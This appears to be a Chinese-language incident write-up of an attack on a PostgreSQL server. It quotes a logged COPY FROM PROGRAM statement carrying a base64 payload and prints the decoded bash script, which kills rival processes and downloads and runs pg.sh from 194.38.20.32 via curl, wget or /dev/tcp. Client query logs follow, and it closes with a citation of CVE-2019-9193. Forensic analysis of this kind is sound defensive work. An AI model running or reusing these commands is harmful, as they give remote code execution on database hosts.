## 5-30攻击步骤记录解析
在5-29日的日志中发现如下log
```sql
DROP TABLE IF EXISTS yBYdXubn;CREATE TABLE yBYdXubn(cmd_output text);COPY yBYdXubn FROM PROGRAM 'echo IyEvYmluL2Jhc2gKcGtpbGwgLWYgenN2Ywpwa2lsbCAtZiBwZGVmZW5kZXJkCnBraWxsIC1mIHVwZGF0ZWNoZWNrZXJkCgpmdW5jdGlvbiBfX2N1cmwoKSB7CiAgcmVhZCBwcm90byBzZXJ2ZXIgcGF0aCA8PDwkKGVjaG8gJHsxLy8vLyB9KQogIERPQz0vJHtwYXRoLy8gLy99CiAgSE9TVD0ke3NlcnZlci8vOip9CiAgUE9SVD0ke3NlcnZlci8vKjp9CiAgW1sgeCIke0hPU1R9IiA9PSB4IiR7UE9SVH0iIF1dICYmIFBPUlQ9ODAKCiAgZXhlYyAzPD4vZGV2L3RjcC8ke0hPU1R9LyRQT1JUCiAgZWNobyAtZW4gIkdFVCAke0RPQ30gSFRUUC8xLjBcclxuSG9zdDogJHtIT1NUfVxyXG5cclxuIiA+JjMKICAod2hpbGUgcmVhZCBsaW5lOyBkbwogICBbWyAiJGxpbmUiID09ICQnXHInIF1dICYmIGJyZWFrCiAgZG9uZSAmJiBjYXQpIDwmMwogIGV4ZWMgMz4mLQp9CgppZiBbIC14ICIkKGNvbW1hbmQgLXYgY3VybCkiIF07IHRoZW4KICBjdXJsIDE5NC4zOC4yMC4zMi9wZy5zaHxiYXNoCmVsaWYgWyAteCAiJChjb21tYW5kIC12IHdnZXQpIiBdOyB0aGVuCiAgd2dldCAtcSAtTy0gMTk0LjM4LjIwLjMyL3BnLnNofGJhc2gKZWxzZQogIF9fY3VybCBodHRwOi8vMTk0LjM4LjIwLjMyL3BnMi5zaHxiYXNoCmZp|base64 -d|bash';SELECT * FROM yBYdXubn;DROP TABLE IF EXISTS yBYdXubn;
```
程序输出是通过对一段经过 Base64 编码的字符串进行解码，并通过管道传递给 bash 命令来执行的。
其代码解码后为:
```bash
#!/bin/bash
pkill -f zsvc
pkill -f pdefenderd
pkill -f updatecheckerd

function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}

if [ -x "$(command -v curl)" ]; then
  curl 194.38.20.32/pg.sh|bash
elif [ -x "$(command -v wget)" ]; then
  wget -q -O- 194.38.20.32/pg.sh|bash
else
  __curl http://194.38.20.32/pg2.sh|bash
fi
```
查找该相似语句，最早于5-24发现，查找该日日志发现异常的sql查询
```sql
[root@linux-idc-128-103 log]# cat  postgresql-2023-05-24_000000.log|grep 349071
2023-05-24 07:40:45.382 GMT [349071] LOG:  execute <unnamed>: SET extra_float_digits = 3
2023-05-24 07:40:45.390 GMT [349071] LOG:  execute <unnamed>: SET application_name = 'PostgreSQL JDBC Driver'
2023-05-24 07:40:45.400 GMT [349071] LOG:  execute <unnamed>: SET application_name = 'Waterdrop 4.8.0 - Metadata'
2023-05-24 07:40:45.428 GMT [349071] LOG:  execute <unnamed>: select string_agg(word, ',') from pg_catalog.pg_get_keywords() where word <> ALL ('{a,abs,absolute,action,ada,add,admin,after,all,allocate,alter,always,and,any,are,array,as,asc,asensitive,assertion,assignment,asymmetric,at,atomic,attribute,attributes,authorization,avg,before,begin,bernoulli,between,bigint,binary,blob,boolean,both,breadth,by,c,call,called,cardinality,cascade,cascaded,case,cast,catalog,catalog_name,ceil,ceiling,chain,char,char_length,character,character_length,character_set_catalog,character_set_name,character_set_schema,characteristics,characters,check,checked,class_origin,clob,close,coalesce,cobol,code_units,collate,collation,collation_catalog,collation_name,collation_schema,collect,column,column_name,command_function,command_function_code,commit,committed,condition,condition_number,connect,connection_name,constraint,constraint_catalog,constraint_name,constraint_schema,constraints,constructors,contains,continue,convert,corr,corresponding,count,covar_pop,covar_samp,create,cross,cube,cume_dist,current,current_collation,current_date,current_default_transform_group,current_path,current_role,current_time,current_timestamp,current_transform_group_for_type,current_user,cursor,cursor_name,cycle,data,date,datetime_interval_code,datetime_interval_precision,day,deallocate,dec,decimal,declare,default,defaults,deferrable,deferred,defined,definer,degree,delete,dense_rank,depth,deref,derived,desc,describe,descriptor,deterministic,diagnostics,disconnect,dispatch,distinct,domain,double,drop,dynamic,dynamic_function,dynamic_function_code,each,element,else,end,end-exec,equals,escape,every,except,exception,exclude,excluding,exec,execute,exists,exp,external,extract,false,fetch,filter,final,first,float,floor,following,for,foreign,fortran,found,free,from,full,function,fusion,g,general,get,global,go,goto,grant,granted,group,grouping,having,hierarchy,hold,hour,identity,immediate,implementation,in,including,increment,indicator,initially,inner,inout,input,insensitive,insert,instance,instantiable,int,integer,intersect,intersection,interval,into,invoker,is,isolation,join,k,key,key_member,key_type,language,large,last,lateral,leading,left,length,level,like,ln,local,localtime,localtimestamp,locator,lower,m,map,match,matched,max,maxvalue,member,merge,message_length,message_octet_length,message_text,method,min,minute,minvalue,mod,modifies,module,month,more,multiset,mumps,name,names,national,natural,nchar,nclob,nesting,new,next,no,none,normalize,normalized,not,"null",nullable,nullif,nulls,number,numeric,object,octet_length,octets,of,old,on,only,open,option,options,or,order,ordering,ordinality,others,out,outer,output,over,overlaps,overlay,overriding,pad,parameter,parameter_mode,parameter_name,parameter_ordinal_position,parameter_specific_catalog,parameter_specific_name,parameter_specific_schema,partial,partition,pascal,path,percent_rank,percentile_cont,percentile_disc,placing,pli,position,power,preceding,precision,prepare,preserve,primary,prior,privileges,procedure,public,range,rank,read,reads,real,recursive,ref,references,referencing,regr_avgx,regr_avgy,regr_count,regr_intercept,regr_r2,regr_slope,regr_sxx,regr_sxy,regr_syy,relative,release,repeatable,restart,result,return,returned_cardinality,returned_length,returned_octet_length,returned_sqlstate,returns,revoke,right,role,rollback,rollup,routine,routine_catalog,routine_name,routine_schema,row,row_count,row_number,rows,savepoint,scale,schema,schema_name,scope_catalog,scope_name,scope_schema,scroll,search,second,section,security,select,self,sensitive,sequence,serializable,server_name,session,session_user,set,sets,similar,simple,size,smallint,some,source,space,specific,specific_name,specifictype,sql,sqlexception,sqlstate,sqlwarning,sqrt,start,state,statement,static,stddev_pop,stddev_samp,structure,style,subclass_origin,submultiset,substring,sum,symmetric,system,system_user,table,table_name,tablesample,temporary,then,ties,time,timestamp,timezone_hour,timezone_minute,to,top_level_count,trailing,transaction,transaction_active,transactions_committed,transactions_rolled_back,transform,transforms,translate,translation,treat,trigger,trigger_catalog,trigger_name,trigger_schema,trim,true,type,uescape,unbounded,uncommitted,under,union,unique,unknown,unnamed,unnest,update,upper,usage,user,user_defined_type_catalog,user_defined_type_code,user_defined_type_name,user_defined_type_schema,using,value,values,var_pop,var_samp,varchar,varying,view,when,whenever,where,width_bucket,window,with,within,without,work,write,year,zone}'::text[])
2023-05-24 07:40:45.477 GMT [349071] LOG:  execute <unnamed>: SELECT current_database(), current_schema(),session_user
2023-05-24 07:40:45.485 GMT [349071] LOG:  execute <unnamed>: SHOW search_path
2023-05-24 07:40:45.498 GMT [349071] LOG:  execute <unnamed>: SELECT db.oid,db.*
2023-05-24 07:40:45.498 GMT [349071] DETAIL:  parameters: $1 = 'postgres'
2023-05-24 07:40:45.515 GMT [349071] LOG:  execute <unnamed>: SELECT n.oid,n.* FROM pg_catalog.pg_namespace n ORDER BY nspname
2023-05-24 07:40:45.540 GMT [349071] LOG:  execute <unnamed>: SELECT t.oid,t.* 
2023-05-24 07:40:45.540 GMT [349071] DETAIL:  parameters: $1 = '16385'
2023-05-24 07:40:45.554 GMT [349071] LOG:  execute <unnamed>: SELECT e.enumlabel 
2023-05-24 07:40:45.554 GMT [349071] DETAIL:  parameters: $1 = '16388'
2023-05-24 07:40:45.564 GMT [349071] LOG:  execute <unnamed>: SELECT e.enumlabel 
2023-05-24 07:40:45.564 GMT [349071] DETAIL:  parameters: $1 = '16696'
2023-05-24 07:40:45.574 GMT [349071] LOG:  execute <unnamed>: SELECT t.oid,t.* 
2023-05-24 07:40:45.574 GMT [349071] DETAIL:  parameters: $1 = '12789'
2023-05-24 07:40:45.599 GMT [349071] LOG:  execute <unnamed>: SELECT t.oid,t.* 
2023-05-24 07:40:45.599 GMT [349071] DETAIL:  parameters: $1 = '11'
2023-05-24 07:40:45.692 GMT [349071] LOG:  execute <unnamed>: SELECT e.enumlabel 
2023-05-24 07:40:45.692 GMT [349071] DETAIL:  parameters: $1 = '16639'
2023-05-24 07:40:45.701 GMT [349071] LOG:  execute <unnamed>: SELECT e.enumlabel 
2023-05-24 07:40:45.701 GMT [349071] DETAIL:  parameters: $1 = '16717'
2023-05-24 07:40:45.712 GMT [349071] LOG:  execute <unnamed>: SELECT t.oid,t.* 
2023-05-24 07:40:45.712 GMT [349071] DETAIL:  parameters: $1 = '2200'
```

## 讨论
>** DISPUTED ** In PostgreSQL 9.3 through 11.2, the "COPY TO/FROM PROGRAM" function allows superusers and users in the 'pg_execute_server_program' group to execute arbitrary code in the context of the database's operating system user. This functionality is enabled by default and can be abused to run arbitrary operating system commands on Windows, Linux, and macOS. NOTE: Third parties claim/state this is not an issue because PostgreSQL functionality for ‘COPY TO/FROM PROGRAM’ is acting as intended. References state that in PostgreSQL, a superuser can execute commands as the server user without using the ‘COPY FROM PROGRAM’.


[CVE-2019-9193 Detail](https://nvd.nist.gov/vuln/detail/CVE-2019-9193)